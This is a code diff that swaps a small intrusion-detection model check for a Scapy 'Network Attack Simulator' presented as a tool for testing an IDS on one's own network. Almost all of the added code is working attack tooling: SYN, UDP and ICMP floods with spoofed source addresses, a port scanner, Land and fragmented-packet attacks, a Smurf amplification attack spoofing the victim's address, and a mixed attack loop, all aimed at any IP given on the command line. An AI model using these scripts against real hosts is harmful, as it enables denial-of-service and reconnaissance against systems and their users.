@@ -1,143 +1,221 @@
-import pandas as pd
-import joblib
+#!/usr/bin/env python3
+"""
+Network Attack Simulator for Testing IDS
+WARNING: Use only for testing purposes on your own network!
+"""
 
-attack_feature_vector = {
-    "duration": 0,
-    "src_bytes": 5000,             
-    "dst_bytes": 6000,             
-    "wrong_fragment": 3,           
-    "urgent": 0,
-    "hot": 20,                     
-    "num_failed_logins": 5,        
-    "logged_in": 0,
-    "num_compromised": 4,          
-    "root_shell": 1,               
-    "su_attempted": 1,
-    "num_root": 2,
-    "num_access_files": 10,        
-    "num_outbound_cmds": 0,
-    "is_guest_login": 0,
-    "count": 200,                  
-    "srv_count": 150,              
-    "serror_rate": 0.9,            
-    "srv_serror_rate": 0.9,
-    "rerror_rate": 0.8,
-    "srv_rerror_rate": 0.8,
-    "same_srv_rate": 0.1,
-    "diff_srv_rate": 0.95,
-    "srv_diff_host_rate": 1.0,
-    "dst_host_count": 500,         
-    "dst_host_srv_count": 400,     
-    "dst_host_same_srv_rate": 0.05,
-    "dst_host_diff_srv_rate": 0.95,
-    "dst_host_same_src_port_rate": 0.0,
-    "dst_host_srv_diff_host_rate": 1.0,
-    "dst_host_serror_rate": 0.9,
-    "dst_host_srv_serror_rate": 0.9,
-    "dst_host_rerror_rate": 0.8,
-    "dst_host_srv_rerror_rate": 0.8,
-    "protocol_type_icmp": 0,
-    "protocol_type_tcp": 1,
-    "protocol_type_udp": 0,
-    "service_IRC": 0,
-    "service_Z39_50": 0,
-    "service_aol": 0,
-    "service_auth": 0,
-    "service_bgp": 0,
-    "service_courier": 0,
-    "service_csnet_ns": 0,
-    "service_ctf": 0,
-    "service_daytime": 0,
-    "service_discard": 0,
-    "service_domain": 0,
-    "service_domain_u": 0,
-    "service_eco_i": 0,
-    "service_ecr_i": 0,
-    "service_efs": 0,
-    "service_exec": 0,
-    "service_finger": 0,
-    "service_ftp_data": 0,
-    "service_gopher": 0,
-    "service_harvest": 0,
-    "service_hostnames": 0,
-    "service_http": 0,
-    "service_http_443": 0,
-    "service_imap4": 0,
-    "service_iso_tsap": 0,
-    "service_klogin": 0,
-    "service_kshell": 0,
-    "service_ldap": 0,
-    "service_link": 0,
-    "service_login": 0,
-    "service_name": 0,
-    "service_netbios_dgm": 0,
-    "service_netbios_ns": 0,
-    "service_netbios_ssn": 0,
-    "service_netstat": 0,
-    "service_nnsp": 0,
-    "service_nntp": 0,
-    "service_other": 1,           
-    "service_pop_3": 0,
-    "service_private": 0,
-    "service_remote_job": 0,
-    "service_shell": 0,
-    "service_smtp": 0,
-    "service_sunrpc": 0,
-    "service_supdup": 0,
-    "service_systat": 0,
-    "service_telnet": 0,
-    "service_urh_i": 0,
-    "service_urp_i": 0,
-    "service_uucp": 0,
-    "service_uucp_path": 0,
-    "service_vmnet": 0,
-    "service_whois": 0,
-    "flag_REJ": 0,
-    "flag_RSTO": 0,
-    "flag_RSTOS0": 0,
-    "flag_RSTR": 1,
-    "flag_S0": 0,
-    "flag_S1": 0,
-    "flag_S2": 0,
-    "flag_S3": 0,
-    "flag_SF": 0,
-    "flag_SH": 0
-}
+from scapy.all import *
+import time
+import random
+import threading
+import argparse
 
+def syn_flood(target_ip, target_port=80, count=100, delay=0.01):
+    """Simulate SYN flood attack"""
+    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
+    
+    for i in range(count):
+        # Random source IP and port
+        src_ip = f"192.168.1.{random.randint(1, 254)}"
+        src_port = random.randint(1024, 65535)
+        
+        # Create SYN packet
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
+        
+        # Send packet
+        send(packet, verbose=0)
+        
+        if i % 10 == 0:
+            print(f"Sent {i} SYN packets...")
+        
+        time.sleep(delay)
+    
+    print(f"SYN flood complete. Sent {count} packets.")
 
+def udp_flood(target_ip, target_port=53, count=100, delay=0.01):
+    """Simulate UDP flood attack"""
+    print(f"Starting UDP flood attack on {target_ip}:{target_port}")
+    
+    for i in range(count):
+        # Random source IP and port
+        src_ip = f"192.168.1.{random.randint(1, 254)}"
+        src_port = random.randint(1024, 65535)
+        
+        # Create UDP packet with random payload
+        payload = "A" * random.randint(10, 1000)
+        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
+        
+        # Send packet
+        send(packet, verbose=0)
+        
+        if i % 10 == 0:
+            print(f"Sent {i} UDP packets...")
+        
+        time.sleep(delay)
+    
+    print(f"UDP flood complete. Sent {count} packets.")
 
-df_attack = pd.DataFrame([attack_feature_vector])
+def icmp_flood(target_ip, count=100, delay=0.01):
+    """Simulate ICMP flood attack"""
+    print(f"Starting ICMP flood attack on {target_ip}")
+    
+    for i in range(count):
+        # Random source IP
+        src_ip = f"192.168.1.{random.randint(1, 254)}"
+        
+        # Create ICMP packet
+        packet = IP(src=src_ip, dst=target_ip) / ICMP()
+        
+        # Send packet
+        send(packet, verbose=0)
+        
+        if i % 10 == 0:
+            print(f"Sent {i} ICMP packets...")
+        
+        time.sleep(delay)
+    
+    print(f"ICMP flood complete. Sent {count} packets.")
 
-selected_features = ['duration', 'src_bytes', 'dst_bytes', 'wrong_fragment', 'urgent', 'hot', 
-                     'num_failed_logins', 'logged_in', 'num_compromised', 'root_shell', 'su_attempted', 
-                     'num_root', 'num_access_files', 'num_outbound_cmds', 'is_guest_login', 'count', 
-                     'srv_count', 'serror_rate', 'srv_serror_rate', 'rerror_rate', 'srv_rerror_rate', 
-                     'same_srv_rate', 'diff_srv_rate', 'srv_diff_host_rate', 'dst_host_count', 
-                     'dst_host_srv_count', 'dst_host_same_srv_rate', 'dst_host_diff_srv_rate', 
-                     'dst_host_same_src_port_rate', 'dst_host_srv_diff_host_rate', 'dst_host_serror_rate', 
-                     'dst_host_srv_serror_rate', 'dst_host_rerror_rate', 'dst_host_srv_rerror_rate', 
-                     'protocol_type_icmp', 'protocol_type_tcp', 'protocol_type_udp', 
-                     'service_IRC', 'service_Z39_50', 'service_aol', 'service_auth', 'service_bgp', 
-                     'service_courier', 'service_csnet_ns', 'service_ctf', 'service_daytime', 
-                     'service_discard', 'service_domain', 'service_domain_u', 'service_eco_i', 
-                     'service_ecr_i', 'service_efs', 'service_exec', 'service_finger', 'service_ftp_data', 
-                     'service_gopher', 'service_harvest', 'service_hostnames', 'service_http', 
-                     'service_http_443', 'service_imap4', 'service_iso_tsap', 'service_klogin', 
-                     'service_kshell', 'service_ldap', 'service_link', 'service_login', 'service_name', 
-                     'service_netbios_dgm', 'service_netbios_ns', 'service_netbios_ssn', 'service_netstat', 
-                     'service_nnsp', 'service_nntp', 'service_other', 'service_pop_3', 'service_private', 
-                     'service_remote_job', 'service_shell', 'service_smtp', 'service_sunrpc', 
-                     'service_supdup', 'service_systat', 'service_telnet', 'service_urh_i', 'service_urp_i', 
-                     'service_uucp', 'service_uucp_path', 'service_vmnet', 'service_whois', 'flag_REJ', 
-                     'flag_RSTO', 'flag_RSTOS0', 'flag_RSTR', 'flag_S0', 'flag_S1', 'flag_S2', 'flag_S3', 
-                     'flag_SF', 'flag_SH']
+def port_scan(target_ip, start_port=1, end_port=1000, delay=0.1):
+    """Simulate port scanning attack"""
+    print(f"Starting port scan on {target_ip} (ports {start_port}-{end_port})")
+    
+    src_ip = f"192.168.1.{random.randint(1, 254)}"
+    
+    for port in range(start_port, end_port + 1):
+        # Create SYN packet for port scan
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), 
+                                                   dport=port, flags="S")
+        
+        # Send packet
+        send(packet, verbose=0)
+        
+        if port % 50 == 0:
+            print(f"Scanned up to port {port}...")
+        
+        time.sleep(delay)
+    
+    print(f"Port scan complete. Scanned {end_port - start_port + 1} ports.")
 
-df_attack = df_attack[selected_features]
+def land_attack(target_ip, target_port=80, count=10):
+    """Simulate Land attack (same source and destination)"""
+    print(f"Starting Land attack on {target_ip}:{target_port}")
+    
+    for i in range(count):
+        # Same source and destination IP (Land attack)
+        packet = IP(src=target_ip, dst=target_ip) / TCP(sport=target_port, 
+                                                       dport=target_port, flags="S")
+        
+        # Send packet
+        send(packet, verbose=0)
+        print(f"Sent Land attack packet {i+1}")
+        
+        time.sleep(0.5)
+    
+    print("Land attack complete.")
 
+def fragmented_attack(target_ip, count=20):
+    """Simulate fragmented packet attack"""
+    print(f"Starting fragmented packet attack on {target_ip}")
+    
+    for i in range(count):
+        # Create fragmented packets
+        payload = "A" * 2000  # Large payload to force fragmentation
+        packet = IP(src=f"192.168.1.{random.randint(1, 254)}", dst=target_ip) / UDP(dport=80) / payload
+        
+        # Fragment the packet
+        fragments = fragment(packet, fragsize=8)
+        
+        for frag in fragments:
+            send(frag, verbose=0)
+        
+        print(f"Sent fragmented packet set {i+1}")
+        time.sleep(0.2)
+    
+    print("Fragmented attack complete.")
 
-with open('Random_Forest_model.pkl', 'rb') as f:
-    model = joblib.load(f)
+def smurf_attack(target_ip, broadcast_ip="192.168.1.255", count=50):
+    """Simulate Smurf attack (ICMP amplification)"""
+    print(f"Starting Smurf attack on {target_ip} via {broadcast_ip}")
+    
+    for i in range(count):
+        # ICMP packet with spoofed source (victim's IP) to broadcast address
+        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()
+        
+        # Send packet
+        send(packet, verbose=0)
+        
+        if i % 10 == 0:
+            print(f"Sent {i} Smurf packets...")
+        
+        time.sleep(0.1)
+    
+    print("Smurf attack complete.")
 
+def mixed_attack_pattern(target_ip, duration=30):
+    """Simulate mixed attack pattern"""
+    print(f"Starting mixed attack pattern on {target_ip} for {duration} seconds")
+    
+    start_time = time.time()
+    attack_count = 0
+    
+    while time.time() - start_time < duration:
+        attack_type = random.choice(['syn', 'udp', 'icmp', 'scan'])
+        
+        if attack_type == 'syn':
+            syn_flood(target_ip, count=5, delay=0.01)
+        elif attack_type == 'udp':
+            udp_flood(target_ip, count=5, delay=0.01)
+        elif attack_type == 'icmp':
+            icmp_flood(target_ip, count=5, delay=0.01)
+        elif attack_type == 'scan':
+            port_scan(target_ip, start_port=random.randint(1, 100), 
+                     end_port=random.randint(101, 200), delay=0.01)
+        
+        attack_count += 1
+        time.sleep(1)
+    
+    print(f"Mixed attack complete. Executed {attack_count} attack sequences.")
 
-prediction = model.predict(df_attack)
-print("Prediction for attack sample:", prediction[0])
+def main():
+    parser = argparse.ArgumentParser(description='Network Attack Simulator for IDS Testing')
+    parser.add_argument('target_ip', help='Target IP address')
+    parser.add_argument('--attack-type', choices=['syn', 'udp', 'icmp', 'scan', 'land', 'frag', 'smurf', 'mixed'], 
+                       default='syn', help='Type of attack to simulate')
+    parser.add_argument('--count', type=int, default=100, help='Number of packets to send')
+    parser.add_argument('--delay', type=float, default=0.01, help='Delay between packets (seconds)')
+    parser.add_argument('--port', type=int, default=80, help='Target port')
+    parser.add_argument('--duration', type=int, default=30, help='Duration for mixed attack (seconds)')
+    
+    args = parser.parse_args()
+    
+    print("=" * 60)
+    print("NETWORK ATTACK SIMULATOR")
+    print("WARNING: Use only for testing on your own network!")
+    print("=" * 60)
+    
+    try:
+        if args.attack_type == 'syn':
+            syn_flood(args.target_ip, args.port, args.count, args.delay)
+        elif args.attack_type == 'udp':
+            udp_flood(args.target_ip, args.port, args.count, args.delay)
+        elif args.attack_type == 'icmp':
+            icmp_flood(args.target_ip, args.count, args.delay)
+        elif args.attack_type == 'scan':
+            port_scan(args.target_ip, 1, args.count, args.delay)
+        elif args.attack_type == 'land':
+            land_attack(args.target_ip, args.port, args.count)
+        elif args.attack_type == 'frag':
+            fragmented_attack(args.target_ip, args.count)
+        elif args.attack_type == 'smurf':
+            smurf_attack(args.target_ip, count=args.count)
+        elif args.attack_type == 'mixed':
+            mixed_attack_pattern(args.target_ip, args.duration)
+            
+    except KeyboardInterrupt:
+        print("\nAttack simulation stopped by user.")
+    except Exception as e:
+        print(f"Error during attack simulation: {e}")
+
+if __name__ == "__main__":
+    main()
